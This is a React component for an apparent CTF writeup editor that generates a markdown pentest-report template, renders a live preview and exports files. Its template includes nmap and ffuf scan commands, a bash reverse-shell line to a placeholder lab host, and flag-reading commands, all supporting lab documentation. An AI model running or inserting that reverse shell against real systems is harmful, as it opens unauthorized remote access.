import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { 
  FileText, 
  Download, 
  Copy, 
  Check, 
  RotateCcw, 
  Sparkles, 
  ExternalLink,
  Code,
  Eye,
  BookOpen,
  FolderGit2,
  Printer
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { Machine } from '../../types';
import { playCyberSound } from '../../utils/helpers';
import { PentestReportModal } from './PentestReportModal';

export const WriteupStudio: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const { machines, writeupMachineId, setWriteupMachineId, updateMachine, soundEnabled } = useCtfStore();

  useEffect(() => {
    if (id && machines.some((m) => m.id === id)) {
      setWriteupMachineId(id);
    }
  }, [id, machines, setWriteupMachineId]);

  const selectedMachine = machines.find((m) => m.id === writeupMachineId) || machines[0];

  const [copied, setCopied] = useState(false);
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [editorContent, setEditorContent] = useState('');

  // Generate standardized template with YAML frontmatter for Obsidian / GitBook
  const generateTemplate = (m: Machine): string => {
    const today = new Date().toISOString().slice(0, 10);
    const tagsList = m.tags.length > 0 ? m.tags.join(', ') : 'ctf, pentest, writeup';

    return `---
title: "HTB / CTF Writeup - ${m.name}"
target_ip: "${m.ip}"
platform: "${m.platform}"
os: "${m.os}"
difficulty: "${m.difficulty}"
status: "${m.status}"
user_flag: "${m.userFlag || 'FLAG{...}'}"
root_flag: "${m.rootFlag || 'FLAG{...}'}"
time_spent: "${Math.round(m.timeSpentSeconds / 60)} minutes"
tags: [${tagsList}]
date: "${today}"
author: "ZeroBox Operator"
---

# ${m.name} — Writeup & Penetration Testing Report
**Target IP:** \`${m.ip}\` | **OS:** ${m.os} | **Platform:** ${m.platform} | **Difficulty:** ${m.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${m.difficulty} (Official) vs ${m.perceivedDifficulty || m.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${m.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${m.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${m.userFlag || 'FLAG{...}'}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${m.rootFlag || 'FLAG{...}'}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`;
  };

  // Synchronize editor content with selected machine writeup
  useEffect(() => {
    if (selectedMachine) {
      if (selectedMachine.writeupMarkdown) {
        setEditorContent(selectedMachine.writeupMarkdown);
      } else {
        const tmpl = generateTemplate(selectedMachine);
        setEditorContent(tmpl);
        updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      }
    }
  }, [selectedMachine?.id]);

  const handleEditorChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setEditorContent(val);
    if (selectedMachine) {
      updateMachine(selectedMachine.id, { writeupMarkdown: val });
    }
  };

  const handleResetToTemplate = () => {
    if (!selectedMachine) return;
    if (confirm(`Reset writeup for ${selectedMachine.name} to standard template?`)) {
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      if (soundEnabled) playCyberSound('root');
    }
  };

  const handleCopyMarkdown = () => {
    navigator.clipboard.writeText(editorContent);
    setCopied(true);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadMarkdown = () => {
    if (!selectedMachine) return;
    const blob = new Blob([editorContent], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `${selectedMachine.name.toLowerCase().replace(/[^a-z0-9]/g, '-')}-writeup.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    if (soundEnabled) playCyberSound('root');
  };

  // Simple, robust markdown preview renderer supporting codeblocks, frontmatter, and headers
  const renderMarkdownPreview = (text: string) => {
    const lines = text.split('\n');
    let inFrontmatter = false;
    let frontmatterLines: string[] = [];
    let inCodeBlock = false;
    let codeBlockLang = '';
    let codeBlockLines: string[] = [];

    const elements: React.ReactNode[] = [];

    lines.forEach((line, idx) => {
      // Frontmatter detection
      if (idx === 0 && line.trim() === '---') {
        inFrontmatter = true;
        return;
      }
      if (inFrontmatter) {
        if (line.trim() === '---') {
          inFrontmatter = false;
          elements.push(
            <div key={`fm-${idx}`} className="mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5">
              <div className="text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1">
                <FolderGit2 className="w-3 h-3 text-cyber-cyan" /> OBSIDIAN / GITBOOK YAML FRONTMATTER
              </div>
              {frontmatterLines.map((fl, fIdx) => (
                <div key={fIdx}>{fl}</div>
              ))}
            </div>
          );
          return;
        }
        frontmatterLines.push(line);
        return;
      }

      // Codeblock detection
      if (line.startsWith('```')) {
        if (!inCodeBlock) {
          inCodeBlock = true;
          codeBlockLang = line.replace('```', '').trim();
          codeBlockLines = [];
        } else {
          inCodeBlock = false;
          elements.push(
            <div key={`cb-${idx}`} className="my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code">
              {codeBlockLang && (
                <div className="bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between">
                  <span>{codeBlockLang}</span>
                  <Code className="w-3 h-3" />
                </div>
              )}
              <pre className="p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap">
                {codeBlockLines.join('\n')}
              </pre>
            </div>
          );
        }
        return;
      }

      if (inCodeBlock) {
        codeBlockLines.push(line);
        return;
      }

      // Headings
      if (line.startsWith('# ')) {
        elements.push(
          <h1 key={idx} className="text-xl font-bold text-white mt-4 mb-2 pb-1 border-b border-cyber-border">
            {line.replace('# ', '')}
          </h1>
        );
      } else if (line.startsWith('## ')) {
        elements.push(
          <h2 key={idx} className="text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2">
            {line.replace('## ', '')}
          </h2>
        );
      } else if (line.startsWith('### ')) {
        elements.push(
          <h3 key={idx} className="text-sm font-semibold text-cyber-text mt-3 mb-1">
            {line.replace('### ', '')}
          </h3>
        );
      } else if (line.startsWith('---')) {
        elements.push(<hr key={idx} className="my-3 border-cyber-border" />);
      } else if (line.startsWith('- ')) {
        elements.push(
          <li key={idx} className="ml-4 text-xs text-cyber-text list-disc my-0.5">
            {line.replace('- ', '')}
          </li>
        );
      } else if (line.trim() === '') {
        elements.push(<div key={idx} className="h-2" />);
      } else {
        elements.push(
          <p key={idx} className="text-xs text-cyber-text leading-relaxed font-sans">
            {line}
          </p>
        );
      }
    });

    return elements;
  };

  return (
    <div className="space-y-4 w-full font-mono">
      {/* Studio Header Bar */}
      <div className="p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center">
            <FileText className="w-5 h-5 text-cyber-cyan" />
          </div>
          <div>
            <h1 className="text-base font-bold text-white flex items-center gap-2">
              EMBEDDED WRITEUP STUDIO
              <span className="text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30">
                OBSIDIAN & GITBOOK READY
              </span>
            </h1>
            <p className="text-xs text-cyber-muted mt-0.5">
              Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export.
            </p>
          </div>
        </div>

        {/* Machine Selector & Export Actions */}
        <div className="flex flex-wrap items-center gap-2.5">
          {/* Machine Dropdown */}
          <div className="flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border">
            <span className="text-[10px] uppercase font-bold text-cyber-muted">Target Box:</span>
            <select
              value={selectedMachine?.id || ''}
              onChange={(e) => setWriteupMachineId(e.target.value)}
              className="bg-transparent text-xs text-white font-bold focus:outline-none max-w-[180px] truncate"
            >
              {machines.map((m) => (
                <option key={m.id} value={m.id} className="bg-cyber-card text-white">
                  {m.name} ({m.platform})
                </option>
              ))}
            </select>
          </div>

          <button
            onClick={handleResetToTemplate}
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white text-xs transition-colors"
            title="Reset to fresh pentest template"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Reset Template</span>
          </button>

          <button
            onClick={handleCopyMarkdown}
            className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-cyan text-white text-xs font-semibold transition-all"
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5 text-cyber-emerald" />
                <span className="text-cyber-emerald">Copied!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Copy Raw</span>
              </>
            )}
          </button>

          <button
            onClick={() => setReportModalOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-cyan/40 hover:border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan/10 text-xs font-bold transition-all shadow-glow-cyan/20"
            title="Generate print-ready Executive Penetration Testing Report"
          >
            <Printer className="w-3.5 h-3.5" />
            <span>Executive Report</span>
          </button>

          {Boolean(selectedMachine?.officialWalkthrough) && (
            <button
              onClick={() => {
                if (!selectedMachine.officialWalkthrough) return;
                const injection = `\n\n---\n\n## 🛡️ Official Hack The Box Walkthrough & Intelligence\n${selectedMachine.officialWalkthrough}\n`;
                const updated = editorContent + injection;
                setEditorContent(updated);
                updateMachine(selectedMachine.id, { writeupMarkdown: updated });
                if (soundEnabled) playCyberSound('engage');
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald/15 border border-cyber-emerald/40 hover:border-cyber-emerald text-cyber-emerald hover:bg-cyber-emerald hover:text-black text-xs font-bold transition-all shadow-sm"
              title="Append official Hack The Box Walkthrough & Intelligence to this writeup"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>+ Official HTB Intel</span>
            </button>
          )}

          <button
            onClick={handleDownloadMarkdown}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald"
          >
            <Download className="w-3.5 h-3.5" />
            <span>Export .md</span>
          </button>
        </div>
      </div>

      {/* Dual-Pane Editor Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]">
        
        {/* Left Pane: Raw Markdown Editor */}
        <div className="flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg">
          <div className="flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs">
            <span className="font-bold text-white flex items-center gap-2">
              <Code className="w-4 h-4 text-cyber-cyan" /> RAW MARKDOWN (YAML & BODY)
            </span>
            <span className="text-[10px] text-cyber-muted">
              {editorContent.length} chars · {editorContent.split('\n').length} lines
            </span>
          </div>

          <textarea
            value={editorContent}
            onChange={handleEditorChange}
            placeholder="Write your penetration testing report or paste notes here..."
            className="flex-1 w-full p-4 bg-cyber-bg text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto"
            spellCheck={false}
          />
        </div>

        {/* Right Pane: Live Rendered Preview */}
        <div className="flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg">
          <div className="flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs">
            <span className="font-bold text-white flex items-center gap-2">
              <Eye className="w-4 h-4 text-cyber-emerald" /> LIVE RENDERED PREVIEW
            </span>
            <span className="text-[10px] text-cyber-emerald font-semibold flex items-center gap-1">
              <BookOpen className="w-3 h-3" /> OBSIDIAN PREVIEW
            </span>
          </div>

          <div className="flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-cyber-card/40">
            {renderMarkdownPreview(editorContent)}
          </div>
        </div>

      </div>

      {/* Executive Pentest Report Modal */}
      <PentestReportModal
        machine={selectedMachine || machines[0] || null}
        isOpen={reportModalOpen}
        onClose={() => setReportModalOpen(false)}
      />
    </div>
  );
};
